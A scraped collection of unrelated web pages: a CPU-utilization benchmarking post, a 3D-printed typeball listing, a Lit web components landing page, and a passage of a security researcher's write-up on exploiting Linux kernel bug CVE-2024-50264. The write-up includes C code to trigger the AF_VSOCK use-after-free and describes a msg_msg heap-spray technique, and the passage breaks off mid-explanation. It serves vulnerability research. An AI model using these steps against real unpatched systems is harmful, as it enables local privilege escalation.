  &lt;main&gt;
    &lt;p&gt;I deal with a lot of servers at work, and one thing everyone wants to know about their servers is how close they are to being at max utilization. It should be easy, right? Just pull up &lt;code&gt;top&lt;/code&gt; or another system monitor tool, look at network, memory and CPU utilization, and whichever one is the highest tells you how close you are to the limits.&lt;/p&gt;
    &lt;p&gt;And yet, whenever people actually try to project these numbers, they find that CPU utilization doesn't quite increase linearly. But how bad could it possibly be?&lt;/p&gt;
    &lt;p&gt;To answer this question, I ran a bunch of stress tests and monitored both how much work they did and what the system-reported CPU utilization was, then graphed the results.&lt;/p&gt;
    &lt;head rend="h1"&gt;Setup&lt;/head&gt;
    &lt;p&gt;For my test machine, I used a desktop computer running Ubuntu with a Ryzen 9 5900X (12 core / 24 thread) processor. I also enabled Precision Boost Overdrive (i.e. Turbo).&lt;/p&gt;
    &lt;p&gt;I vibe-coded a script that runs stress-ng in a loop, first using 24 workers and attempting to run them each at different utilizations from 1% to 100%, then using 1 to 24 workers all at 100% utilization. It used different stress testing method and measured the number of operations that could be completed ("Bogo ops1").&lt;/p&gt;
    &lt;p&gt;The reason I did two different methods was that operating systems are smart about how they schedule work, and scheduling a small number of workers at 100% utilization can be done optimally (spoilers) but with 24 workers all at 50% utilization it's hard for the OS to do anything other than spreading the work evenly.&lt;/p&gt;
    &lt;head rend="h1"&gt;Results&lt;/head&gt;
    &lt;p&gt;You can see the raw CSV results here.&lt;/p&gt;
    &lt;head rend="h2"&gt;General CPU&lt;/head&gt;
    &lt;p&gt;The most basic test just runs all of stress-ng's CPU stress tests in a loop.&lt;/p&gt;
    &lt;p&gt;You can see that when the system is reporting 50% CPU utilization, it's actually doing 60-65% of the actual maximum work it can do.&lt;/p&gt;
    &lt;head rend="h2"&gt;64-bit Integer Math&lt;/head&gt;
    &lt;p&gt;But maybe that one was just a fluke. What if we just run some random math on 64-bit integers?&lt;/p&gt;
    &lt;p&gt;This one is even worse! At "50% utilization", we're actually doing 65-85% of the max work we can get done. It can't possibly get worse than that though, right?&lt;/p&gt;
    &lt;head rend="h2"&gt;Matrix Math&lt;/head&gt;
    &lt;p&gt;Something is definitely off. Doing matrix math, "50% utilization" is actually 80% to 100% of the max work that can be done.&lt;/p&gt;
    &lt;p&gt;In case you were wondering about the system monitor screenshot from the start of the article, that was a matrix math test running with 12 workers, and you can see that it really did report 50% utilization even though additional workers do absolutely nothing (except make the utilization number go up).&lt;/p&gt;
    &lt;head rend="h1"&gt;What's Going On?&lt;/head&gt;
    &lt;head rend="h2"&gt;Hyperthreading&lt;/head&gt;
    &lt;p&gt;You might notice that this the graph keeps changing at 50%, and I've helpfully added piecewise linear regressions showing the fit.&lt;/p&gt;
    &lt;p&gt;The main reason this is happening is hyperthreading: Half of the "cores" on this machine (and most machines) are sharing resources with other cores. If I run 12 workers on this machine, they each get scheduled on their own physical core with no shared resources, but once I go over that, each additional worker is sharing resources with another. In some cases (general CPU benchmarks), this makes things slightly worse, and in some cases (SIMD-heavy matrix math), there are no useful resources left to share.&lt;/p&gt;
    &lt;head rend="h2"&gt;Turbo&lt;/head&gt;
    &lt;p&gt;It's harder to see, but Turbo is also having an effect. This particular processor runs at 4.9 GHz at low utilization, but slowly drops to 4.3 GHz as more cores become active2.&lt;/p&gt;
    &lt;p&gt;Note the zoomed-in y-axis. The clock speed "only" drops by 15% on this processor.&lt;/p&gt;
    &lt;p&gt;Since CPU utilization is calculated as busy cycles / total cycles, this means the denominator is getting smaller as the numerator gets larger, so we get yet another reason why actual CPU utilization increases faster than linearly.&lt;/p&gt;
    &lt;head rend="h1"&gt;Does This Matter?&lt;/head&gt;
    &lt;p&gt;If you look at CPU utilization and assume it will increase linearly, you're going to have a rough time. If you're using the CPU efficiently (running above "50%" utilization), the reported utilization is an underestimate, sometimes significantly so.&lt;/p&gt;
    &lt;p&gt;And keep in mind that I've only shown results for one processor, but hyperthreading performance and Turbo behavior can vary wildly between different processors, especially from different companies (AMD vs Intel).&lt;/p&gt;
    &lt;p&gt;The best way I know to work around this is to run benchmarks and monitor actual work done:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Benchmark how much work your server can do before having errors or unacceptable latency.&lt;/item&gt;
      &lt;item&gt;Report how much work your server is currently doing.&lt;/item&gt;
      &lt;item&gt;Compare those two metrics instead of CPU utilization.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Bogo ops is presumably a reference to BogoMIPS, a "bogus" benchmark that Linux does at startup to very roughly understand CPU performance.Â â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;One of the main constraints processors operate under is needing to dissipate heat fast enough. When only one core is running, the processor can give that core some of the heat headroom that other cores aren't using and run it faster, but it can't do that all of the cores are running.Power usage works similarly and can be a constraint in some environments (usually not in a desktop computer, but frequently in servers).Â â©&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;

    &lt;p&gt;&lt;lb/&gt;Update, July 7 2023: Dave Hayden took the resin-printed typeball concept and improved on it greatly. I'm extremely grateful that he took on all the hard work of iteratively going through and dialing in the perfect values to make a functional ball, and I'm pleased to think I contributed in some way to his achievements.&lt;/p&gt;
    &lt;p&gt;-----------------------------------------&lt;lb/&gt;This is a Comic Sans typeball designed to work with the IBM Selectric typewriters that take 88-character type elements. More information about the 3D printed typeballs can be found at the Github repo for the project.&lt;lb/&gt;I have not yet printed and tested this exact model! I tested a previous revision which was just a bit too tall and 90Â° off; I've corrected the letter rotations and shaved 0.2 mm off the height.&lt;lb/&gt;To affix the typeball to the typewriter, you will need a small clip such as this one or a bent wire.&lt;lb/&gt;The blank ball (not the letters) is an edited version of the OpenSCAD Selectric Typeball by 1944GPW and is licensed with the Creative Commons - Attribution license.&lt;/p&gt;
    &lt;p&gt;The author marked this model as their own original creation.&lt;/p&gt;

  &lt;main&gt;&lt;p&gt;Simple. Fast. Web Components.&lt;/p&gt;&lt;head rend="h1"&gt;Simple&lt;/head&gt;&lt;p&gt;Skip the boilerplate&lt;/p&gt;&lt;p&gt;Building on top of the Web Components standards, Lit adds just what you need to be happy and productive: reactivity, declarative templates and a handful of thoughtful features to reduce boilerplate and make your job easier. Every Lit feature is carefully designed with web platform evolution in mind.&lt;/p&gt;&lt;head rend="h1"&gt;Fast&lt;/head&gt;&lt;p&gt;Tiny footprint, instant updates&lt;/p&gt;&lt;p&gt;Weighing in at around 5 KB (minified and compressed), Lit helps keep your bundle size small and your loading time short. And rendering is blazing fast, because Lit touches only the dynamic parts of your UI when updating — no need to rebuild a virtual tree and diff it with the DOM.&lt;/p&gt;&lt;head rend="h1"&gt;Web Components&lt;/head&gt;&lt;p&gt;Interoperable &amp;amp; future-ready&lt;/p&gt;&lt;p&gt;Every Lit component is a native web component, with the superpower of interoperability. Web components work anywhere you use HTML, with any framework or none at all. This makes Lit ideal for building shareable components, design systems, or maintainable, future-ready sites and apps.&lt;/p&gt;&lt;head rend="h1"&gt;Custom Elements&lt;/head&gt;&lt;p&gt;Lit components are standard custom elements, so the browser treats them exactly like built-in elements. Use them in hand-written HTML or framework code, output them from your CMS or static site builder, even create instances in JavaScript — they just work!&lt;/p&gt;&lt;head rend="h1"&gt;Scoped styles&lt;/head&gt;&lt;p&gt;Lit scopes your styles by default, using Shadow DOM. This keeps your CSS selectors simple and ensures that your component’s styles don't affect — and aren't affected by — any other styles on the page.&lt;/p&gt;&lt;head rend="h1"&gt;Reactive properties&lt;/head&gt;&lt;p&gt;Declare reactive properties to model your component’s API and internal state. A Lit component efficiently re-renders whenever a reactive property (or corresponding HTML attribute) changes.&lt;/p&gt;&lt;head rend="h1"&gt;Declarative templates&lt;/head&gt;&lt;p&gt;Lit templates, based on tagged template literals, are simple, expressive and fast, featuring HTML markup with native JavaScript expressions inline. No custom syntax to learn, no compilation required.&lt;/p&gt;&lt;head rend="h1"&gt;Build anything with Lit&lt;/head&gt;&lt;head rend="h2"&gt;Shareable Components&lt;/head&gt;&lt;p&gt;Need to deliver interactive content or features that drop into any site, built on any stack?

    &lt;head rend="h1"&gt;Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel&lt;/head&gt;
    &lt;p&gt;Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project kernel-hack-drill and show how it helped me to exploit CVE-2024-50264.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bug collision story&lt;/head&gt;
    &lt;p&gt;I first found a bug in &lt;code&gt;AF_VSOCK&lt;/code&gt; back in 2021 and published the article Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in &lt;code&gt;AF_VSOCK&lt;/code&gt;. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (&lt;code&gt;kworker&lt;/code&gt;). Convinced the path forward would be painful, I shelved the bug. This was a wrong decision.&lt;/p&gt;
    &lt;p&gt;Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim (@v4bel) and Wongi Lee (@qwerty): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. Their patch turned my PoC exploit into a null-ptr-deref:&lt;/p&gt;
    &lt;p&gt;Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.&lt;/p&gt;
    &lt;p&gt;Viktor Vasnetsov: Vityaz at the Crossroads (1882)&lt;/p&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;CVE-2024-50264 analysis&lt;/head&gt;
    &lt;p&gt;The vulnerability CVE-2024-50264 was introduced in August 2016 by commit 06a8fc78367d in Linux v4.8. It is a race condition in &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets that happens between the &lt;code&gt;connect()&lt;/code&gt; system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.&lt;/p&gt;
    &lt;p&gt;The kernel uses a freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object. Its size is 80 bytes, which is suitable for the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. The memory corruption is a UAF write executed by a kernel worker.&lt;/p&gt;
    &lt;p&gt;However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that it's the worst bug to exploit I've ever seen. The Pwnie Award is well-deserved. I'll outline those constraints shortly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reproducing the bug using an "immortal signal"&lt;/head&gt;
    &lt;p&gt;First, an attacker should create a listening virtual socket (server vsock):&lt;/p&gt;
    &lt;code&gt;int ret = -1;
int vsock1 = 0;

vsock1 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock1 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = bind(vsock1, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
if (ret != 0)
	err_exit("[-] binding vsock");

ret = listen(vsock1, 0); /* backlog = 0 */
if (ret != 0)
	err_exit("[-] listening vsock");
&lt;/code&gt;
    &lt;p&gt;Then the attacker should try to open a connection from a client vsock:&lt;/p&gt;
    &lt;code&gt;#define UAF_PORT 0x2712

int vsock2 = 0;
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_LOCAL
};

vsock2 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock2 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
    &lt;p&gt;To trigger the bug, the attacker should interrupt this &lt;code&gt;connect()&lt;/code&gt; system call with a POSIX signal. @v4bel &amp;amp; @qwerty used &lt;code&gt;SIGKILL&lt;/code&gt;, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:&lt;/p&gt;
    &lt;code&gt;struct sigevent sev = {};
timer_t race_timer = 0;

sev.sigev_notify = SIGEV_SIGNAL;
sev.sigev_signo = 33;
ret = timer_create(CLOCK_MONOTONIC, &amp;amp;sev, &amp;amp;race_timer);
&lt;/code&gt;
    &lt;p&gt;My fuzzer discovered that a timer can fire signal 33 and interrupt &lt;code&gt;connect()&lt;/code&gt;. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As &lt;code&gt;man 7 nptl&lt;/code&gt; explains:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33). One of these signals is used to support thread cancellation and POSIX timers (see&lt;/p&gt;&lt;code&gt;timer_create(2)&lt;/code&gt;); the other is used as part of a mechanism that ensures all threads in a process always have the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.&lt;/quote&gt;
    &lt;p&gt;True, these signals cannot be used in applications, but they are perfect for my exploit 😉&lt;/p&gt;
    &lt;p&gt;I use &lt;code&gt;timer_settime()&lt;/code&gt; for &lt;code&gt;race_timer&lt;/code&gt;, which lets me choose the exact moment signal 33 interrupts &lt;code&gt;connect()&lt;/code&gt;. Moreover, the signal is invisible to the exploit process and doesn't kill it.&lt;/p&gt;
    &lt;head rend="h2"&gt;About memory corruption&lt;/head&gt;
    &lt;p&gt;The race condition succeeds when a signal interrupts the &lt;code&gt;connect()&lt;/code&gt; system call while the vulnerable socket is in the &lt;code&gt;TCP_ESTABLISHED&lt;/code&gt; state. The socket then drops into the &lt;code&gt;TCP_CLOSING&lt;/code&gt; state:&lt;/p&gt;
    &lt;code&gt;if (signal_pending(current)) {
	err = sock_intr_errno(timeout);
	sk-&amp;gt;sk_state = sk-&amp;gt;sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
	sock-&amp;gt;state = SS_UNCONNECTED;
	vsock_transport_cancel_pkt(vsk);
	vsock_remove_connected(vsk);
	goto out_wait;
}
&lt;/code&gt;
    &lt;p&gt;The second attempt to connect the vulnerable vsock to the server vsock using a different &lt;code&gt;svm_cid&lt;/code&gt; (&lt;code&gt;VMADDR_CID_HYPERVISOR&lt;/code&gt;) provokes memory corruption.&lt;/p&gt;
    &lt;code&gt;struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_HYPERVISOR
};

/* this connect will schedule the kernel worker performing UAF */
ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
    &lt;p&gt;Under the hood, the &lt;code&gt;connect()&lt;/code&gt; system call executes &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function switches the virtual socket to the new &lt;code&gt;svm_cid&lt;/code&gt; transport and frees the resources tied to the previous vsock transport:&lt;/p&gt;
    &lt;code&gt;if (vsk-&amp;gt;transport) {
	if (vsk-&amp;gt;transport == new_transport)
		return 0;

	/* transport-&amp;gt;release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */
	vsk-&amp;gt;transport-&amp;gt;release(vsk);
	vsock_deassign_transport(vsk);
}
&lt;/code&gt;
    &lt;p&gt;This procedure closes the old vsock transport in &lt;code&gt;virtio_transport_close()&lt;/code&gt; and frees the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. However, due to the erroneous &lt;code&gt;TCP_CLOSING&lt;/code&gt; state of the socket, &lt;code&gt;virtio_transport_close()&lt;/code&gt; initiates further communication. To handle that activity, the kernel schedules a &lt;code&gt;kworker&lt;/code&gt; that eventually calls &lt;code&gt;virtio_transport_space_update()&lt;/code&gt;, which operates on the freed structure:&lt;/p&gt;
    &lt;code&gt;static bool virtio_transport_space_update(struct sock *sk, struct sk_buff *skb)
{
	struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
	struct vsock_sock *vsk = vsock_sk(sk);
	struct virtio_vsock_sock *vvs = vsk-&amp;gt;trans; /* ptr to freed object */
	bool space_available;

	if (!vvs)
		return true;

	spin_lock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* proceed if 4 bytes are zero (UAF write non-zero to lock) */
	vvs-&amp;gt;peer_buf_alloc = le32_to_cpu(hdr-&amp;gt;buf_alloc); /* UAF write 4 bytes */
	vvs-&amp;gt;peer_fwd_cnt = le32_to_cpu(hdr-&amp;gt;fwd_cnt); /* UAF write 4 bytes */
	space_available = virtio_transport_has_space(vsk); /* UAF read, not interesting */
	spin_unlock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* UAF write, restore 4 zero bytes */
	return space_available;
}
&lt;/code&gt;
    &lt;p&gt;The following diagram shows the layout of the UAF in the vulnerable object:&lt;/p&gt;
    &lt;p&gt;Here in yellow I show the &lt;code&gt;tx_lock&lt;/code&gt; field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the &lt;code&gt;peer_buf_alloc&lt;/code&gt; and &lt;code&gt;peer_fwd_cnt&lt;/code&gt; fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.&lt;/p&gt;
    &lt;p&gt;The value written to &lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt; can be controlled from the userspace:&lt;/p&gt;
    &lt;code&gt;/* Increase the range for the value that we want to write during UAF: */
uaf_val_limit = 0x1lu; /* can't be zero */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));
uaf_val_limit = 0xfffffffflu;
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));

/* Set the 4-byte value that we want to write during UAF: */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
           &amp;amp;uaf_val, sizeof(uaf_val));
&lt;/code&gt;
    &lt;p&gt;The field &lt;code&gt;virtio_vsock_sock.peer_fwd_cnt&lt;/code&gt; tracks how many bytes have been pushed through vsock using &lt;code&gt;sendmsg()&lt;/code&gt;/&lt;code&gt;recvmsg()&lt;/code&gt;. It is zero by default (four zero bytes).&lt;/p&gt;
    &lt;head rend="h2"&gt;Not so fast. CVE-2024-50264 has limitations&lt;/head&gt;
    &lt;p&gt;As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;Reproducing this race condition is very unstable.&lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/item&gt;
      &lt;item&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero, as noted above.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I've ever seen. I guess that's why it received the Pwnie Award 2025 as the Best Privilege Escalation.&lt;/p&gt;
    &lt;head rend="h2"&gt;First thoughts on exploit strategy&lt;/head&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty was complex:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;A large-scale BPF JIT spray that filled a significant portion of physical memory&lt;/item&gt;
      &lt;item&gt;The SLUBStick technique from Graz University of Technology, which allowed to: &lt;list rend="ul"&gt;&lt;item&gt;Determine the number of objects in the active slab using a timing side channel&lt;/item&gt;&lt;item&gt;Then, place the client and server &lt;code&gt;virtio_vsock_sock&lt;/code&gt;objects in different slabs, landing one at the end of its slab and the other at the start of the next slab&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The Dirty Pagetable technique, which allowed to use the UAF object for overwriting a page table entry (PTE)&lt;/item&gt;
      &lt;item&gt;Modifying a PTE to make it possibly point to a BPF JIT region&lt;/item&gt;
      &lt;item&gt;Inserting a privilege-escalation payload into the BPF code&lt;/item&gt;
      &lt;item&gt;Communicating via a socket to execute the privilege-escalation payload.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.&lt;/p&gt;
    &lt;p&gt;I decided not to search victim objects inside the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. Ubuntu Server 24.04 ships with &lt;code&gt;kconfig&lt;/code&gt; options that neutralize naive heap spraying for UAF exploitation:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_SLAB_BUCKETS=y&lt;/code&gt;, which creates a set of separate slab caches for allocations with user-controlled data&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES=y&lt;/code&gt;. Here's a quote from the kernel documentation about it:&lt;p&gt;It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That's why I decided to perform the cross-cache attack anyway.&lt;/p&gt;
    &lt;p&gt;The first victim object I decided to try was &lt;code&gt;struct cred&lt;/code&gt;. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim &lt;code&gt;cred&lt;/code&gt;, because slabs for the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; have size 96 bytes (half of 192). The diagram below shows how two vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects overlap the &lt;code&gt;cred&lt;/code&gt; object. The memory corruption may happen on one of the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects.&lt;/p&gt;
    &lt;p&gt;Unfortunately, &lt;code&gt;struct cred&lt;/code&gt; reallocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects doesn't provide anything useful for the attacker:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If the UAF happened on the first &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the kernel would hang in&lt;code&gt;spin_lock_bh()&lt;/code&gt;, because&lt;code&gt;cred&lt;/code&gt;has a non-null&lt;code&gt;uid&lt;/code&gt;value at the place of&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;If the UAF happened on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, writing controlled data to&lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt;would corrupt the&lt;code&gt;cred.request_key_auth&lt;/code&gt;pointer. I had no idea how to use it without a prior infoleak.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;cred&lt;/code&gt; object didn't work for me, so I started to search for the next candidate. My next victim object for the memory corruption was &lt;code&gt;msg_msg&lt;/code&gt;. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article "Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel").&lt;/p&gt;
    &lt;p&gt;It was a novel approach back then. This time, I set out to create something new again.&lt;/p&gt;
    &lt;p&gt;I chose a 96-byte &lt;code&gt;msg_msg&lt;/code&gt; because the slab allocator would use slabs of the same size for this &lt;code&gt;msg_msg&lt;/code&gt; and &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. That would allow the UAF write to land at a fixed offset in the victim &lt;code&gt;msg_msg&lt;/code&gt; object. The following diagram shows what happens with the &lt;code&gt;msg_msg&lt;/code&gt; object allocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; is the kernelspace pointer to the previous object in the linked list. This pointer is zero when &lt;code&gt;msg_msg&lt;/code&gt; is created (see &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON&lt;/code&gt;) and then it is initialized with a non-null value when &lt;code&gt;msg_msg&lt;/code&gt; is inserted into the message queue. Unfortunately, this non-null pointer is interpreted as &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;. That makes the &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; function hang while executing &lt;code&gt;spin_lock_bh()&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To bypass this restriction, I needed the kernel to initialize &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; after the UAF write. I looked for a way to postpone placing &lt;code&gt;msg_msg&lt;/code&gt; in the message queue and eventually found the solution.&lt;/p&gt;
    &lt;head rend="h2"&gt;msg_msg spray allowing m_list field corruption (novel technique)&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I filled the message queue almost completely before sending the target &lt;code&gt;msg_msg&lt;/code&gt;.&lt;list rend="ul"&gt;&lt;item&gt;The message queue size is &lt;code&gt;MSGMNB=16384&lt;/code&gt;bytes.&lt;/item&gt;&lt;item&gt;I sent 2 clogging messages of 8191 bytes each without calling the &lt;code&gt;msgrcv()&lt;/code&gt;syscall.&lt;/item&gt;&lt;item&gt;Only 2 bytes were left in the queue.&lt;/item&gt;&lt;item&gt;I used &lt;code&gt;mtype = 1&lt;/code&gt;for these messages.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The message queue size is &lt;/item&gt;
      &lt;item&gt;Then I performed spraying by calling &lt;code&gt;msgsnd()&lt;/code&gt;for the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;list rend="ul"&gt;&lt;item&gt;I called the &lt;code&gt;msgsnd()&lt;/code&gt;syscall in separate pthreads and used&lt;code&gt;mtype = 2&lt;/code&gt;for these messages to distinguish them from the clogging messages.&lt;/item&gt;&lt;item&gt;The kernel allocates target &lt;code&gt;msg_msg&lt;/code&gt;and then blocks&lt;code&gt;msgsnd()&lt;/code&gt;in&lt;code&gt;ipc/msg.c&lt;/code&gt;while it waits for space in the message queue:&lt;/item&gt;&lt;/list&gt;&lt;code&gt;if (msg_fits_inqueue(msq, msgsz)) break; /* queue full, wait: */ if (msgflg &amp;amp; IPC_NOWAIT) { err = -EAGAIN; goto out_unlock0; } /* enqueue the sender and prepare to block */ ss_add(msq, &amp;amp;s, msgsz); if (!ipc_rcu_getref(&amp;amp;msq-&amp;gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ipc_unlock_object(&amp;amp;msq-&amp;gt;q_perm); rcu_read_unlock(); schedule();&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;I called the &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;While the&lt;/p&gt;&lt;code&gt;msgsnd()&lt;/code&gt;syscalls were waiting for space in the message queue, I performed the UAF write corrupting the&lt;code&gt;m_list&lt;/code&gt;,&lt;code&gt;m_type&lt;/code&gt;, and&lt;code&gt;m_ts&lt;/code&gt;fields of one of the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;After the UAF write, I called&lt;/p&gt;&lt;code&gt;msgrcv()&lt;/code&gt;for type 1 clogging messages.&lt;/item&gt;
      &lt;item&gt;Then the blocked &lt;code&gt;msgsnd()&lt;/code&gt;syscall woke up to add the sprayed&lt;code&gt;msg_msg&lt;/code&gt;to the queue and the kernel fixed the corrupted&lt;code&gt;m_list&lt;/code&gt;field:&lt;code&gt;if (!pipelined_send(msq, msg, &amp;amp;wake_q)) { /* no one is waiting for this message, enqueue it */ list_add_tail(&amp;amp;msg-&amp;gt;m_list, &amp;amp;msq-&amp;gt;q_messages); msq-&amp;gt;q_cbytes += msgsz; msq-&amp;gt;q_qnum++; percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_bytes, msgsz); percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_hdrs, 1); }&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cool! This technique is also useful for blind overwriting of &lt;code&gt;msg_msg&lt;/code&gt; using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted &lt;code&gt;m_list&lt;/code&gt; pointers. In my particular case, this approach allowed me to avoid &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; hanging in &lt;code&gt;spin_lock_bh()&lt;/code&gt;:&lt;/p&gt;
